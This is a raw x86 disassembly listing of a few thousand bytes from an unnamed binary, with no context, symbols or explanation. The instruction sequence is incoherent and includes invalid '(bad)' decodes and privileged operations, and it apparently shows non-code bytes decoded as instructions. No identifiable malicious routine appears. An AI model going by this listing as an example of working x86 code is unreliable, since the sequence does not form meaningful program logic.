  403e8f:	add    DWORD PTR [edx],0xc031242e
  403e95:	add    al,0x1
  403e97:	xchg   BYTE PTR [ebx],dl
  403e99:	dec    ebp
  403e9a:	sub    BYTE PTR [esi],cl
  403e9c:	add    BYTE PTR [ecx],0x70
  403e9f:	adc    DWORD PTR [eax],eax
  403ea1:	inc    eax
  403ea2:	rcl    BYTE PTR [ecx+0x68],0x4
  403ea6:	or     al,0xc
  403ea8:	xor    DWORD PTR [eax-0x6bd77bb6],esp
  403eae:	ret    0x0
  403eb1:	add    DWORD PTR [esi-0x80],edx
  403eb4:	inc    edx
  403eb5:	shr    BYTE PTR [ecx],1
  403eb7:	inc    ecx
  403eb8:	adc    DWORD PTR [edx+0x0],edx
  403ebb:	xor    BYTE PTR [eax],0xa
  403ebe:	adc    BYTE PTR [edx+0x4a864c0],0x10
  403ec5:	outs   dx,DWORD PTR ds:[esi]
  403ec6:	or     DWORD PTR [ecx+eax*2+0x1a02524],eax
  403ecd:	ror    BYTE PTR [ecx-0x20],1
  403ed0:	sbb    BYTE PTR [esi-0x7f],al
  403ed3:	bound  edx,QWORD PTR [edx]
  403ed5:	add    ah,BYTE PTR [ecx+0x8]
  403ed8:	add    eax,0x8888164
  403edd:	push   es
  403ede:	pop    es
  403edf:	add    cl,BYTE PTR [ecx]
  403ee1:	adc    BYTE PTR [edx],al
  403ee3:	add    DWORD PTR [ecx-0x80],ebp
  403ee6:	mov    ah,0x20
  403ee8:	inc    edx
  403ee9:	or     ah,cl
  403eeb:	adc    BYTE PTR [edx],cl
  403eed:	inc    ebx
  403eee:	and    BYTE PTR [eax],al
  403ef0:	add    BYTE PTR [eax],dl
  403ef2:	rol    DWORD PTR [edx],0x45
  403ef5:	or     eax,ecx
  403ef7:	add    BYTE PTR [eax],al
  403ef9:	add    BYTE PTR [ebx+eax*1+0x15ff84a4],bh
  403f00:	inc    eax
  403f01:	add    DWORD PTR [ebx+0x0],0x4
  403f05:	or     BYTE PTR [eax+0x58821],dl
  403f0b:	es mov ch,0x31
  403f0e:	test   BYTE PTR [eax+0x50589c30],al
  403f14:	pop    eax
  403f15:	shl    BYTE PTR [eax-0x7f],cl
  403f18:	ret    
  403f19:	add    BYTE PTR [eax+0x10],0x4
  403f1d:	add    BYTE PTR [ebx],al
  403f1f:	mov    eax,edx
  403f21:	add    DWORD PTR [eax],eax
  403f23:	xor    BYTE PTR [eax],0xa1
  403f26:	mov    eax,ds:0x806a1
  403f2b:	push   eax
  403f2c:	test   BYTE PTR [edx],dl
  403f2e:	xor    al,BYTE PTR [eax+ecx*4+0x29106025]
  403f35:	add    al,0x4
  403f37:	add    edx,DWORD PTR [esi-0x7367ff3f]
  403f3d:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  403f3f:	add    BYTE PTR [ebx],al
  403f41:	cmp    DWORD PTR [edx+0x0],esp
  403f44:	es inc edx
  403f46:	test   BYTE PTR [ebx+ebp*1],ch
  403f49:	add    al,0x40
  403f4b:	add    BYTE PTR [eax],al
  403f4d:	push   ebx
  403f4e:	je     0x403f70
  403f50:	adc    al,0x1a
  403f52:	sbb    BYTE PTR [eax-0x38],ah
  403f55:	add    DWORD PTR [eax],0x6
  403f58:	popa   
  403f59:	adc    dl,BYTE PTR [eax-0x6357bd42]
  403f5f:	arpl   WORD PTR [eax],sp
  403f61:	add    ecx,eax
  403f63:	adc    DWORD PTR [eax],edx
  403f65:	nop
  403f66:	adc    BYTE PTR [eax],al
  403f68:	add    eax,DWORD PTR [eax]
  403f6a:	add    ecx,eax
  403f6c:	push   esp
  403f6d:	mov    eax,eax
  403f6f:	add    BYTE PTR [ecx+0xc210001],ah
  403f75:	popf   
  403f76:	mov    WORD PTR [eax],es
  403f78:	or     BYTE PTR [eax],cl
  403f7a:	add    BYTE PTR [ecx],al
  403f7c:	and    al,0x51
  403f7e:	sub    BYTE PTR [eax+edx*1+0x414cc1],al
  403f85:	pusha  
  403f86:	pop    eax
  403f87:	add    ah,BYTE PTR [eax]
  403f89:	and    eax,0xc4051c30
  403f8e:	and    BYTE PTR [edx-0x70],al
  403f91:	add    BYTE PTR [edx+0x8],al
  403f94:	psubusb mm0,QWORD PTR [edx]
  403f97:	add    DWORD PTR [ecx],eax
  403f99:	sbb    bl,BYTE PTR [edx+0x1a417430]
  403f9f:	test   BYTE PTR [eax],0x8a
  403fa2:	add    al,BYTE PTR [edi]
  403fa4:	and    DWORD PTR [eax],eax
  403fa6:	or     al,BYTE PTR [eax]
  403fa8:	add    BYTE PTR [edx],ah
  403faa:	add    BYTE PTR [esp+edx*1-0x2ded2fa8],bl
  403fb1:	test   BYTE PTR [eax+ecx*2],cl
  403fb4:	add    BYTE PTR [eax],0x10
  403fb7:	ror    BYTE PTR [eax],1
  403fb9:	or     eax,DWORD PTR [eax]
  403fbb:	or     BYTE PTR [edx],al
  403fbd:	mov    BYTE PTR [eax],dl
  403fbf:	and    bl,BYTE PTR [esp+ecx*1+0x50000002]
  403fc6:	add    al,0x48
  403fc8:	ror    BYTE PTR [eax],0x43
  403fcb:	adc    al,0xdc
  403fcd:	inc    edi
  403fce:	xor    DWORD PTR [ecx+0x40802188],edx
  403fd4:	inc    eax
  403fd5:	mov    al,ds:0x8c000552
  403fda:	and    cl,BYTE PTR [edx-0x60]
  403fdd:	and    al,BYTE PTR [edi+0x480cd08]
  403fe3:	add    eax,0x95502208
  403fe8:	adc    dl,0x10
  403feb:	xchg   esp,eax
  403fec:	test   dh,bl
  403fee:	add    BYTE PTR [ecx+ebx*1],al
  403ff1:	pop    ebp
  403ff2:	add    al,0x24
  403ff4:	xor    BYTE PTR [ebx],al
  403ff6:	inc    edx
  403ff7:	adc    cl,BYTE PTR [ecx]
  403ff9:	and    edx,eax
  403ffb:	inc    edx
  403ffc:	loop   0x40402e
  403ffe:	pop    eax
  403fff:	fcom   DWORD PTR [esi]
  404001:	and    al,0x62
  404003:	xor    BYTE PTR [eax],cl
  404005:	inc    edx
  404006:	xchg   esp,eax
  404007:	and    BYTE PTR [eax],cl
  404009:	and    dx,ax
  40400c:	add    BYTE PTR [edi+0x0],0x20
  404010:	leave  
  404011:	xor    DWORD PTR [eax+0x0],eax
  404014:	cmp    eax,0xe010140c
  404019:	add    al,0x0
  40401b:	adc    ah,BYTE PTR [eax-0x79]
  40401e:	xor    BYTE PTR [ecx],dh
  404020:	stos   DWORD PTR es:[edi],eax
  404021:	or     eax,esp
  404023:	mov    eax,ds:0x5cd040c5
  404028:	add    DWORD PTR [eax],eax
  40402a:	inc    ebp
  40402b:	add    BYTE PTR [eax+edx*1],dl
  40402e:	and    al,0x4
  404030:	add    eax,0x28214
  404035:	xor    DWORD PTR [ecx],eax
  404037:	inc    esp
  404038:	or     dl,BYTE PTR [eax]
  40403a:	pop    eax
  40403b:	inc    ecx
  40403c:	adc    DWORD PTR gs:[edx],esp
  40403f:	add    DWORD PTR ds:0x28c006f3,edx
  404045:	and    al,0x2c
  404047:	add    BYTE PTR [ebp-0x6eafffa4],0x65
  40404e:	add    al,0x32
  404050:	inc    eax
  404051:	adc    eax,eax
  404053:	add    al,0xb6
  404055:	test   BYTE PTR [ecx],al
  404057:	pushf  
  404058:	sub    BYTE PTR [ebp+0x1c08854],al
  40405e:	adc    eax,0x55000984
  404063:	rol    BYTE PTR [eax],cl
  404065:	add    BYTE PTR [edx+0x1],cl
  404068:	mov    eax,cr2
  40406b:	mov    ch,0x80
  40406d:	adc    BYTE PTR [ecx],al
  40406f:	test   BYTE PTR [edi+0x10],al
  404072:	push   ss
  404073:	pop    eax
  404074:	xchg   esp,eax
  404075:	dec    esp
  404076:	add    BYTE PTR [ecx],0x22
  404079:	add    BYTE PTR [ecx+0x460c01d0],al
  40407f:	or     al,0x2
  404081:	add    BYTE PTR [ecx],al
  404083:	inc    eax
  404084:	pusha  
  404085:	mov    al,0x40
  404087:	push   ss
  404088:	mov    BYTE PTR [eax],al
  40408a:	or     al,0x80
  40408c:	add    al,BYTE PTR [eax]
  40408e:	sub    al,0x19
  404090:	add    BYTE PTR [ecx],0xc0
  404093:	mov    al,ds:0x400c288
  404098:	add    BYTE PTR [edx+0x25],al
  40409b:	add    BYTE PTR [edx+edi*1-0x70],ch
  40409f:	rol    BYTE PTR ds:0x9a14049,1
  4040a5:	sbb    BYTE PTR [ecx+eax*1],0x0
  4040a9:	sub    eax,DWORD PTR [eax+0x6b000004]
  4040af:	and    cl,BYTE PTR [eax+0x7]
  4040b2:	adc    BYTE PTR [eax],al
  4040b4:	and    al,0xb2
  4040b6:	or     BYTE PTR [eax-0x7a],ah
  4040b9:	mov    BYTE PTR [eax],al
  4040bb:	add    BYTE PTR [eax],cl
  4040bd:	add    BYTE PTR [eax-0x6e],al
  4040c0:	xor    BYTE PTR [edx],al
  4040c2:	or     BYTE PTR [eax+eax*2+0x22869388],cl
  4040c9:	pusha  
  4040ca:	jbe    0x404121
  4040cc:	sub    cl,BYTE PTR [eax+edx*1]
  4040cf:	push   eax
  4040d0:	add    DWORD PTR [ebp+0x4],eax
  4040d3:	and    al,0x4
  4040d5:	add    BYTE PTR [edx+eax*2-0x74ee7f40],cl
  4040dc:	and    al,0xc8
  4040de:	add    al,0x41
  4040e0:	mov    al,ds:0x7800103
  4040e5:	add    BYTE PTR [eax+0x2e01044],al
  4040eb:	popa   
  4040ec:	add    BYTE PTR [eax],dl
  4040ee:	mov    dl,0x6a
  4040f0:	add    BYTE PTR [esp+ecx*1+0x4],al
  4040f4:	(bad)  
  4040f5:	sub    eax,DWORD PTR [eax-0xbef73f7]
  4040fb:	adc    BYTE PTR [eax],0x2
  4040fe:	add    BYTE PTR [edx+0x28042460],al
  404104:	add    BYTE PTR [ecx-0x2f3bffad],al
  40410a:	add    DWORD PTR ds:0xa8614880,ecx
  404110:	test   al,0x48
  404112:	and    BYTE PTR [ecx+0x2c40d041],dl
  404118:	jo     0x40413a
  40411a:	sub    BYTE PTR [eax+0x44],al
  40411d:	inc    eax
  40411e:	adc    al,0x40
  404120:	adc    al,BYTE PTR [ecx]
  404122:	push   esp
  404123:	adc    BYTE PTR [edx+0x0],al
  404126:	add    al,0x1d
  404128:	stos   DWORD PTR es:[edi],eax
  404129:	or     BYTE PTR [eax],al
  40412b:	adc    BYTE PTR [edx+0x61082270],ah
  404131:	add    BYTE PTR [edx-0x78],ah
  404134:	or     BYTE PTR [edx],al
  404136:	mov    ss,WORD PTR [ebx]
  404138:	int3   
  404139:	inc    eax
  40413a:	push   eax
  40413b:	inc    eax
  40413c:	jno    0x4040be
  40413e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40413f:	inc    eax
  404140:	or     eax,DWORD PTR [edi]
  404142:	inc    edx
  404143:	sub    esp,DWORD PTR [esi+0x19102290]
  404149:	push   edx
  40414a:	add    BYTE PTR [eax+ecx*2+0xc00501],cl
  404151:	ror    DWORD PTR [eax-0x5f],1
  404154:	add    BYTE PTR [ecx+0x20cb8290],bl
  40415a:	cwde   
  40415b:	call   0xd006:0x6204058
  404162:	mov    bl,0x4
  404164:	or     DWORD PTR [edi],eax
  404166:	add    BYTE PTR [ebx],al
  404168:	xchg   DWORD PTR [eax],edx
  40416a:	xchg   BYTE PTR [edx+0x3],cl
  40416d:	or     esp,DWORD PTR [eax]
  40416f:	pop    es
  404170:	add    eax,0x4141332
  404175:	test   BYTE PTR [edi+ecx*1],bl
  404178:	or     BYTE PTR [edi-0x80],dl
  40417b:	add    al,0x90
  40417d:	add    DWORD PTR [ecx],eax
  40417f:	jns    0x404192
  404181:	sub    cl,BYTE PTR [esi+0x22080180]
  404187:	lock sub dl,BYTE PTR [ecx+0x45081047]
  40418e:	xchg   esp,eax
  40418f:	out    0x60,al
  404191:	adc    DWORD PTR [eax+ecx*1],eax
  404194:	push   es
  404195:	or     BYTE PTR [eax],al
  404197:	xor    BYTE PTR [eax+eax*1],ah
  40419a:	or     BYTE PTR [ebx+0x2348816],ah
  4041a0:	nop
  4041a1:	xchg   ecx,eax
  4041a2:	add    BYTE PTR [eax+eax*2],ah
  4041a5:	and    al,0x22
  4041a7:	popa   
  4041a8:	or     al,0x1
  4041aa:	rcl    BYTE PTR [eax+eiz*2+0x20],1
  4041ae:	add    BYTE PTR [eax+ebx*4],dl
  4041b1:	mov    BYTE PTR [eax],al
  4041b3:	xchg   ecx,eax
  4041b4:	and    DWORD PTR [edx],eax
  4041b6:	or     BYTE PTR [edx+0x70],al
  4041b9:	add    BYTE PTR [eax+0x15],ah
  4041bc:	rol    BYTE PTR [ecx],0x0
  4041bf:	sub    BYTE PTR [eax],dh
  4041c1:	add    cl,cl
  4041c3:	or     al,dh
  4041c5:	and    DWORD PTR [esi-0x7abf57f8],0x31
  4041cc:	ror    BYTE PTR [ecx],1
  4041ce:	dec    esi
  4041cf:	and    BYTE PTR [eax],al
  4041d1:	add    al,0x5
  4041d3:	add    DWORD PTR [esp+eax*2],esp
  4041d6:	loopne 0x404222
  4041d8:	xchg   BYTE PTR [ebp-0x6f77bb00],al
  4041de:	or     eax,0x30904400
  4041e3:	add    BYTE PTR [ebx+0x2d850908],0x8
  4041ea:	add    bl,BYTE PTR [eax]
  4041ec:	add    dl,BYTE PTR [eax]
  4041ee:	popa   
  4041ef:	dec    eax
  4041f0:	add    BYTE PTR [ecx+0x19],cl
  4041f3:	cdq    
  4041f4:	inc    edx
  4041f5:	add    al,0x0
  4041f7:	add    al,BYTE PTR [edx]
  4041f9:	adc    BYTE PTR [eax],al
  4041fb:	or     BYTE PTR [edx],al
  4041fd:	and    eax,0xd0080
  404202:	imul   eax,DWORD PTR [esp],0x12
  404206:	inc    edx
  404207:	adc    al,0x40
  404209:	pop    es
  40420a:	pop    ds
  40420b:	or     BYTE PTR [edi],al
  40420d:	test   BYTE PTR [eax],ah
  40420f:	add    eax,0x5431007
  404214:	add    al,0x14
  404216:	push   es
  404217:	sub    al,0x24
  404219:	test   BYTE PTR [edx+eax*1],al
  40421c:	add    al,al
  40421e:	nop
  40421f:	sbb    eax,edx
  404221:	adc    BYTE PTR [eax],cl
  404223:	cmp    al,BYTE PTR [ecx]
  404225:	inc    eax
  404226:	and    al,0x4b
  404228:	sub    eax,DWORD PTR [eax+eiz*4]
  40422b:	add    DWORD PTR [eax],esi
  40422d:	ret    
  40422e:	sbb    al,BYTE PTR [eax+ecx*2]
  404231:	adc    al,0x80
  404233:	test   BYTE PTR [eax],al
  404235:	cmp    edx,DWORD PTR [ecx]
  404237:	xor    BYTE PTR [ebx],al
  404239:	add    eax,0x804624a
  40423e:	and    cl,BYTE PTR [esi]
  404240:	add    al,al
  404242:	xor    BYTE PTR ds:0x20000200,dh
  404248:	mov    DWORD PTR [ecx+eiz*2+0xa],0x89801008
  404250:	adc    al,BYTE PTR [eax-0x7f467e78]
  404256:	add    dl,BYTE PTR [eax]
  404258:	ss loopne 0x4041db
  40425b:	sbb    BYTE PTR [eax+0x10],cl
  40425e:	sub    al,0x88
  404260:	and    DWORD PTR ds:0x210216,eax
  404266:	imul   eax,DWORD PTR [ebp+0x10c0a044],0x40482a21
  404270:	inc    eax
  404271:	add    BYTE PTR [edx],al
  404273:	inc    eax
  404274:	adc    BYTE PTR [eax-0x7fdd794b],cl
  40427a:	inc    ebx
  40427b:	add    ecx,eax
  40427d:	test   DWORD PTR [edx],eax
  40427f:	xor    bh,BYTE PTR [edx]
  404281:	push   ebp
  404282:	add    BYTE PTR [eax],ah
  404284:	add    eax,0x3284
  404289:	enter  0x1049,0x8
  40428d:	add    al,BYTE PTR [ebx+0x50]
  404290:	and    BYTE PTR [edx+0x100a4010],ah
  404296:	jb     0x404301
  404298:	adc    al,BYTE PTR [edx]
  40429a:	dec    eax
  40429b:	ret    0x5244
  40429e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40429f:	add    BYTE PTR [esi+0x10],al
  4042a2:	xor    eax,0x4004010
  4042a7:	add    BYTE PTR [eax+0x0],al
  4042aa:	add    al,0x5
  4042ac:	pop    eax
  4042ad:	rcl    BYTE PTR [eax-0x80],0xa0
  4042b1:	adc    DWORD PTR [edx+0x46],eax
  4042b4:	rol    DWORD PTR [eax-0x2acf9efc],1
  4042ba:	mov    edx,edx
  4042bc:	add    BYTE PTR [eax+edx*1],0x20
  4042c0:	and    al,BYTE PTR [edx]
  4042c2:	or     BYTE PTR [eax],0x70
  4042c5:	or     al,BYTE PTR [eax-0x78965fe6]
  4042cb:	or     BYTE PTR [eax],cl
  4042cd:	xchg   BYTE PTR [edx],dl
  4042cf:	mov    al,ds:0x5220406
  4042d4:	mov    al,ds:0x4a0454
  4042d9:	add    BYTE PTR ds:0x81202,ah
  4042df:	add    ch,BYTE PTR [esp+eax*4]
  4042e2:	pusha  
  4042e3:	add    BYTE PTR [eax],cl
  4042e5:	push   eax
  4042e6:	or     DWORD PTR [eax+0x10020a1],0x14
  4042ed:	add    BYTE PTR [eax],al
  4042ef:	add    BYTE PTR [ebx+0xe09021],al
  4042f5:	add    al,0x2
  4042f7:	add    BYTE PTR [ecx+0x148402c0],al
  4042fd:	add    BYTE PTR [eax+0x4100505],0x41
  404304:	adc    BYTE PTR [eax],al
  404306:	pusha  
  404307:	add    BYTE PTR [eax],ah
  404309:	xchg   edx,eax
  40430a:	add    DWORD PTR [edx+0x48],eax
  40430d:	dec    eax
  40430e:	and    BYTE PTR [edi],al
  404310:	and    BYTE PTR [eax+0x70241228],0xd0
  404317:	inc    ecx
  404318:	nop
  404319:	add    ah,al
  40431b:	dec    edx
  40431c:	sbb    BYTE PTR [ecx],al
  40431e:	pop    eax
  40431f:	and    BYTE PTR [eax],cl
  404321:	add    BYTE PTR [ecx],al
  404323:	shl    BYTE PTR [eax-0x80],0x48
  404327:	add    BYTE PTR [eax],cl
  404329:	inc    eax
  40432a:	mov    al,BYTE PTR [ebx+0x16]
  40432d:	add    BYTE PTR [eax+0x2],al
  404330:	test   al,0x1
  404332:	add    BYTE PTR [eax],cl
  404334:	and    al,0x85
  404336:	add    DWORD PTR [eax+0x23],eax
  404339:	adc    BYTE PTR [ebx],al
  40433b:	add    BYTE PTR [eax+edx*2-0x5fffdc00],0x4
  404343:	nop
  404344:	int3   
  404345:	adc    al,BYTE PTR [esi+0x8]
  404348:	es out 0x84,eax
  40434b:	and    BYTE PTR [eax+0x25078001],al
  404351:	inc    ecx
  404352:	dec    edx
  404353:	add    dl,BYTE PTR [esp+eax*8-0x40]
  404357:	inc    eax
  404358:	adc    BYTE PTR [eax],ah
  40435a:	or     eax,0x81000020
  40435f:	add    BYTE PTR [eax],ch
  404361:	add    DWORD PTR [eax+0x410d42],0x51401001
  40436b:	push   esi
  40436c:	add    BYTE PTR [esi+eax*1-0x6abdae00],al
  404373:	sub    BYTE PTR [eax+0x52916a92],ah
  404379:	or     al,BYTE PTR [esi]
  40437b:	add    BYTE PTR [eax],al
  40437d:	nop
  40437e:	mov    al,ds:0x84010
  404383:	add    BYTE PTR [edx],0xa1
  404386:	or     BYTE PTR [eax+0x82804],0x24
  40438d:	add    DWORD PTR [ecx],0xffffff82
  404390:	call   0x880:0x83062c02
  404397:	test   BYTE PTR [ebx],al
  404399:	sbb    BYTE PTR [eiz*1-0x3d435dfc],ah
  4043a0:	add    eax,DWORD PTR [eax*4+0x8806054]
  4043a7:	inc    esp
  4043a8:	test   BYTE PTR [eax],ch
  4043aa:	add    BYTE PTR [edi+edx*1-0x40],al
  4043ae:	or     BYTE PTR ds:0xa8100084,cl
  4043b4:	add    eax,0x32302400
  4043b9:	add    DWORD PTR [ecx],eax
  4043bb:	or     BYTE PTR [ecx+0x21202104],cl
  4043c1:	pusha  
  4043c2:	add    al,0x44
  4043c4:	and    BYTE PTR [ecx+0x10c08050],al
  4043ca:	add    BYTE PTR [ecx],ah
  4043cc:	xor    BYTE PTR [eax],0xa0
  4043cf:	or     al,0x2
  4043d1:	inc    eax
  4043d2:	add    BYTE PTR [eax],al
  4043d4:	sub    BYTE PTR [eax+0x519f2e88],0x41
  4043db:	sub    al,BYTE PTR [ecx]
  4043dd:	mov    DWORD PTR [eax],eax
  4043df:	add    BYTE PTR [eax],dh
  4043e1:	adc    al,0x84
  4043e3:	add    eax,DWORD PTR [eax-0x40]
  4043e6:	adc    DWORD PTR ds:0x824c2040,eax
  4043ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4043ed:	push   ecx
  4043ee:	add    cl,BYTE PTR [eax+0x684af048]
  4043f4:	and    DWORD PTR [eax+eax*1-0x80],0x40c0c436
  4043fc:	mov    DWORD PTR [edx+0x48000014],esp
  404402:	inc    edx
  404403:	daa    
  404404:	pusha  
  404405:	test   BYTE PTR [ecx],al
  404407:	or     DWORD PTR [eax+0x142aa009],edi
  40440d:	bound  eax,QWORD PTR [esi-0x77ffeff8]
  404413:	dec    esi
  404414:	nop
  404415:	add    BYTE PTR [eax],al
  404417:	es jb  0x40441a
  40441a:	add    eax,esp
  40441c:	and    edx,ecx
  40441e:	inc    eax
  40441f:	add    BYTE PTR [eax-0x70],al
  404422:	add    BYTE PTR [eax+0x9],ah
  404425:	add    DWORD PTR [ecx],eax
  404427:	add    BYTE PTR [edx+eax*2+0x687a2011],0xa
  40442f:	lds    edi,FWORD PTR [ebp+0x2]
  404432:	push   ss
  404433:	es and dl,al
  404436:	pusha  
  404437:	ret    
  404438:	adc    eax,0x72080104
  40443d:	xchg   esp,eax
  40443e:	add    BYTE PTR [edx],al
  404440:	xor    DWORD PTR [eax-0x80],eax
  404443:	mov    eax,0x17290410
  404448:	adc    al,0x0
  40444a:	add    esp,eax
  40444c:	jo     0x40448e
  40444e:	adc    DWORD PTR [eax],0x16
  404451:	ret    0xa20
  404454:	ror    BYTE PTR [esi],0xa5
  404457:	add    al,BYTE PTR [edx+0x42110218]
  40445d:	and    eax,0x70c1825c
  404462:	rcl    BYTE PTR [eax],0x51
  404465:	rol    BYTE PTR [ebx],1
  404467:	add    DWORD PTR [eax],ecx
  404469:	xor    ch,BYTE PTR [ecx]
  40446b:	and    DWORD PTR [ecx],eax
  40446d:	adc    al,0x4
  40446f:	or     DWORD PTR [eax+0x82080],eax
  404475:	push   ebp
  404476:	add    DWORD PTR [eax-0x2f],ecx
  404479:	adc    al,0x82
  40447b:	xor    DWORD PTR [esp+edx*1-0x50],edx
  40447f:	sub    al,0x40
  404481:	sbb    BYTE PTR [ebp-0x3fb7ff40],dl
  404487:	add    DWORD PTR [eax],0x9c00140
  40448d:	rol    dl,1
  40448f:	add    edx,edx
  404491:	adc    BYTE PTR [eax],al
  404493:	inc    eax
  404494:	inc    ecx
  404495:	or     DWORD PTR [eax],eax
  404497:	add    DWORD PTR [ebx],edi
  404499:	clc    
  40449a:	and    BYTE PTR [eax],0x20
  40449d:	inc    edx
  40449e:	add    BYTE PTR [eax],bl
  4044a0:	rcl    BYTE PTR ds:0x44440068,0x4a
  4044a7:	xor    al,0x20
  4044a9:	pusha  
  4044aa:	sub    al,0xd4
  4044ac:	adc    bh,BYTE PTR [edx+0x50]
  4044af:	add    BYTE PTR [eax],cl
  4044b1:	inc    edx
  4044b2:	test   DWORD PTR ds:0x4740224c,edx
  4044b8:	mov    al,ds:0x42a9084
  4044bd:	adc    eax,DWORD PTR [eax+0x44070208]
  4044c3:	add    esp,DWORD PTR [esi+0x28]
  4044c6:	push   es
  4044c7:	test   BYTE PTR [ebx],cl
  4044c9:	inc    ecx
  4044ca:	inc    eax
  4044cb:	sub    al,0x90
  4044cd:	sbb    al,0x2
  4044cf:	add    DWORD PTR ds:0x80888011,eax
  4044d5:	add    BYTE PTR [eax+0x0],al
  4044d8:	rol    BYTE PTR [esi],0x28
  4044db:	xor    DWORD PTR [ecx+eax*4],esi
  4044de:	add    BYTE PTR [eax+0x42],0x0
  4044e2:	or     al,BYTE PTR [ecx+0x20004221]
  4044e8:	mov    eax,ds:0x42402420
  4044ed:	xchg   esp,eax
  4044ee:	add    DWORD PTR [eax],esp
  4044f0:	dec    edx
  4044f1:	sub    BYTE PTR [ecx+0x20],0x22
  4044f5:	adc    eax,DWORD PTR [ecx]
  4044f7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4044f8:	or     eax,0x820424
  4044fd:	or     al,BYTE PTR [eax+eiz*1]
  404500:	and    al,0x14
  404502:	pusha  
  404503:	push   esp
  404504:	sub    BYTE PTR [eax],al
  404506:	adc    al,0x0
  404508:	and    BYTE PTR [eax+0x3060202],ah
  40450e:	js     0x404497
  404510:	inc    eax
  404511:	nop
  404512:	test   BYTE PTR [eax+0x21],al
  404515:	add    ah,al
  404517:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404518:	or     BYTE PTR [eax+0x60],dh
  40451b:	add    al,0x62
  40451d:	add    al,BYTE PTR [edx]
  40451f:	nop
  404520:	adc    al,0x83
  404522:	adc    al,BYTE PTR [eax]
  404524:	push   ecx
  404525:	adc    BYTE PTR [ecx],dl
  404527:	add    ah,cl
  404529:	xor    DWORD PTR [eax+0x64],ebx
  40452c:	or     BYTE PTR [eax-0x3c],ch
  40452f:	adc    BYTE PTR [ecx],al
  404531:	add    DWORD PTR [eax+0xd460434],esp
  404537:	adc    BYTE PTR [eax],ah
  404539:	adc    BYTE PTR [eax+0x124040f3],al
  40453f:	mov    cs,WORD PTR [eax]
  404541:	nop
  404542:	pusha  
  404543:	inc    eax
  404544:	inc    esp
  404545:	jb     0x404594
  404547:	jl     0x40452c
  404549:	(bad)  
  40454a:	adc    BYTE PTR [eax],bh
  40454c:	add    al,0x68
  40454e:	add    BYTE PTR [ecx+0x22c3c110],ah
  404554:	push   es
  404555:	or     al,0x40
  404557:	add    al,BYTE PTR [eax+0x48004180]
  40455d:	sub    al,0x2
  40455f:	call   0x10512da4
  404564:	adc    ah,al
  404566:	fs push eax
  404568:	add    al,BYTE PTR [edi]
  40456a:	inc    eax
  40456b:	inc    edx
  40456c:	adc    al,BYTE PTR [eax+0x74]
  40456f:	add    al,0x0
  404571:	push   ds
  404572:	fadd   DWORD PTR [ebx+0x20060162]
  404578:	and    al,BYTE PTR [eax+eiz*1+0x40984700]
  40457f:	add    al,0x0
  404581:	xchg   ebp,eax
  404582:	pop    DWORD PTR [ebx]
  404584:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404585:	adc    BYTE PTR [edx],al
  404587:	retf   
  404588:	add    esi,DWORD PTR [ecx+0x19]
  40458b:	or     dl,ch
  40458d:	and    BYTE PTR [edx],dl
  40458f:	and    al,0x0
  404591:	mov    dh,0x35
  404593:	inc    eax
  404594:	and    eax,0x140c0014
  404599:	test   BYTE PTR [ecx],bl
  40459b:	add    BYTE PTR [ecx-0x4fe6bef8],0x90
  4045a2:	shl    BYTE PTR [edx],cl
  4045a4:	or     eax,DWORD PTR [eax+0x10]
  4045a7:	adc    eax,DWORD PTR [ecx+0x18]
  4045aa:	loope  0x4045ec
  4045ac:	and    DWORD PTR [ebp+0x85c2329],edx
  4045b2:	inc    esp
  4045b3:	add    DWORD PTR [eax+0x79d9108],edx
  4045b9:	add    al,0x10
  4045bb:	and    BYTE PTR [eax+edx*8-0x73af6f50],bh
  4045c2:	xor    BYTE PTR [eax],al
  4045c4:	add    BYTE PTR [eax],0x80
  4045c7:	add    BYTE PTR ds:0x4240a802,ah
  4045cd:	nop
  4045ce:	or     al,0x2
  4045d0:	or     al,dh
  4045d2:	and    ecx,esi
  4045d4:	add    al,al
  4045d6:	adc    eax,DWORD PTR [ebx]
  4045d8:	add    al,BYTE PTR [ecx]
  4045da:	add    dl,ah
  4045dc:	shr    BYTE PTR [esp+ecx*1],0x80
  4045e0:	sub    BYTE PTR [esi+eax*1],al
  4045e3:	sbb    al,0x44
  4045e5:	add    eax,0x6240109
  4045ea:	inc    eax
  4045eb:	add    BYTE PTR [ebx+0x14],ah
  4045ee:	or     DWORD PTR [eax],edx
  4045f0:	add    BYTE PTR [eax],al
  4045f2:	add    BYTE PTR [eax],dl
  4045f4:	call   0x48716a7d
  4045f9:	adc    ch,BYTE PTR [esi]
  4045fb:	or     ecx,DWORD PTR [eax]
  4045fd:	es add al,0x10
  404600:	xor    al,0x81
  404602:	xor    BYTE PTR [edx+0xc],al
  404605:	add    al,BYTE PTR [eax]
  404607:	or     eax,0x770c020
  40460c:	mov    al,ds:0x180389e8
  404611:	mov    DWORD PTR [eax],0x41408814
  404617:	adc    BYTE PTR [esp+eax*1],cl
  40461a:	add    BYTE PTR [edx],al
  40461c:	dec    eax
  40461d:	adc    BYTE PTR [eax+0x2],ch
  404620:	dec    ebx
  404621:	add    BYTE PTR [ecx-0x7e],0x0
  404625:	(bad)  
  404627:	ror    BYTE PTR [eax],0x90
  40462a:	mov    BYTE PTR [ecx],al
  40462c:	push   eax
  40462d:	add    BYTE PTR [ebx],ah
  40462f:	adc    esp,DWORD PTR [esp+ecx*1]
  404632:	or     ah,BYTE PTR [eax+0xa2e0130]
  404638:	inc    esp
  404639:	add    al,0x12
  40463b:	test   BYTE PTR [ebp+0x29],al
  40463e:	pop    eax
  40463f:	sub    BYTE PTR [eax+eiz*2],al
  404642:	and    al,0x0
  404644:	sub    BYTE PTR [edx],al
  404646:	rol    dl,0x2d
  404649:	add    al,0xd
  40464b:	and    BYTE PTR [edx],0x80
  40464e:	add    BYTE PTR [edx+0x1],bl
  404651:	and    DWORD PTR [eax],esi
  404653:	add    esp,0x80446005
  404659:	add    BYTE PTR ds:0x4b40c24,dl
  40465f:	xor    BYTE PTR [ecx],dh
  404661:	add    al,0x20
  404663:	mov    BYTE PTR [eax+0x51],bl
  404666:	inc    eax
  404667:	add    BYTE PTR [ecx+ecx*1],0x9
  40466b:	or     BYTE PTR [edx+0x20120095],cl
  404671:	add    BYTE PTR [eax-0x80],0x20
